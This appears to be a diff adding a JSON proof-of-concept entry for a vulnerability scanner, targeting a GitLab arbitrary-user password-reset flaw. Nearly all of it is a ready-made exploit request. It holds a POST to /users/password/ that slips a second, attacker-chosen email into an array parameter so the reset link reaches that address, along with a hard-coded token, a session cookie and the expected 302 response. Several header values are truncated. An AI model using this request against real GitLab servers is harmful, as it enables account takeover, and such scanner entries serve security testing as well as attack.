@@ -1,0 +1,27 @@
+{
+	"name":"GitLab任意用户密码重置",
+	"tag":"gitlab",
+	"type":"other",
+	"poc":{
+		"pocGet":"/users/password/",
+		"pocPost":"authenticity_token=Ok6w7Wt0FwKeOCci9ucskZWrjRDDV0kYkwlSOIrGQmmQ2fk5k3vsH-8vM5UIiGn-0tpJ9D78SUb-9AT1TZ8VfA&user%5Bemail%5D=admin2@qq.com&user[email][]=admin@qq.com\r\n",
+		"header":{
+			"Origin":" https",
+			"Cookie":" _gitlab_session=78331028df93ce92682f77ac91945004; preferred_language=en",
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Connection":" keep-alive",
+			"Sec-Fetch-Dest":" document",
+			"Sec-Fetch-Site":" same-origin",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Sec-Fetch-Mode":" navigate",
+			"Upgrade-Insecure-Requests":" 1",
+			"Sec-Fetch-User":" ?1",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Content-Length":" 150",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"302",
+		"pattern":"()"
+	}
+}
